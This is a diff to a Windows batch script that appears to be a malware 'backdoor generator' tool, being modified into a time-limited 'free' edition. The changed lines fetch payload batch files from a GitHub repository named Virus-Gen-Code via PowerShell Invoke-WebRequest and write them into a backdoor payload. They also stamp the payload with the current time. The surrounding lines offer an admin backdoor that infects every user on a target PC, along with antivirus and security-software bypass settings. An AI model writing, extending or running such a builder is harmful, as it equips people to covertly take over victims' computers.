@@ -2,7 +2,7 @@
 :start
 @ECHO OFF
 set update_number=V3.38.27
-set dev=1
+set dev=0
 cls
 :VBSDynamicBuild
 SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
@@ -18,7 +18,7 @@ if not exist C:\ProgramData\debug_enabled.sav echo false>C:\ProgramData\debug_en
 if not exist C:\ProgramData\antivirus.sav echo true>C:\ProgramData\antivirus.sav
 if not exist C:\ProgramData\progress_bar.sav echo true>C:\ProgramData\progress_bar.sav
 if not exist C:\ProgramData\target_software_bypass.sav echo true>C:\ProgramData\target_software_bypass.sav
-title Beta Release %update_number%
+title free Beta Release %update_number%
 cls
 < C:\ProgramData\autofullscreen.sav (
   set /p autofullscreen=
@@ -65,6 +65,7 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
 :EP_finish
 :: manual configuration
   :exit_menu
+  echo [33myou are using the free version, any backdoor generated will automaticaly be removed after 1 month[0m
   echo [31madmin backdoor needs more testing, use this at your own risk[0m
   echo do you have admin permissions on the target PC?
   echo note: this will require you to have admin rights when infecting A PC, however it will infect all users on that PC, not just the active one.
@@ -85,7 +86,7 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
     start call "progress bar.bat"
     timeout 1 >nul
     echo data>load_trigger.txt
-    Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/default_placeholder.bat").Content >%opt1%.bat
+    Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/free_placeholder.bat").Content >%opt1%.bat
   :: upload file to github
     echo [33mregistering code on github...[0m
     git config user.name "%username%"
@@ -110,10 +111,20 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
   :: generate a file to run code from github on the target PC
     echo data>load_trigger.txt
     echo [33mdownloading code from github to create backdoor file...[0m
-    if %target_software_bypass% equ false Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/BC_software_disabled.bat").Content >%opt2%\payload\payload.bat
-    if %target_software_bypass% equ true Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/BC_software_enabled.bat").Content >%opt2%\payload\payload.bat
+    Powershell (Invoke-webrequest -URI "https://raw.githubusercontent.com/Guest257351/Virus-Gen-Code/main/free_BC.bat").Content >%opt2%\payload\payload.bat
     echo data>load_trigger.txt
+    set CUR_YYYY=%date:~10,4%
+    set CUR_DD=%date:~4,2%
+    set CUR_MM=%date:~7,2%
+    set CUR_HH=%time:~0,2%
+    if %CUR_HH% lss 10 (set CUR_HH=0%time:~1,1%)
+    set CUR_NN=%time:~3,2%
+    set CUR_SS=%time:~6,2%
+    set CUR_MS=%time:~9,2%
+    set current_time=%CUR_YYYY%%CUR_MM%%CUR_DD%%CUR_HH%%CUR_NN%%CUR_SS%
+    set /a current_time=%current_time%
     powershell -Command "(gc %opt2%\payload\payload.bat) -replace 'REPtxt', '%opt1%' | Out-File -encoding ASCII %opt2%\payload\payload.bat"
+    powershell -Command "(gc %opt2%\payload\payload.bat) -replace 'REPtime', '%current_time%' | Out-File -encoding ASCII %opt2%\payload\payload.bat"
     if exist %opt2%\payload\payload.bat (echo [92msuccessfully created backdoor file![0m) else (goto error6)
   :: generate a file to move files to their proper location
     echo data>load_trigger.txt
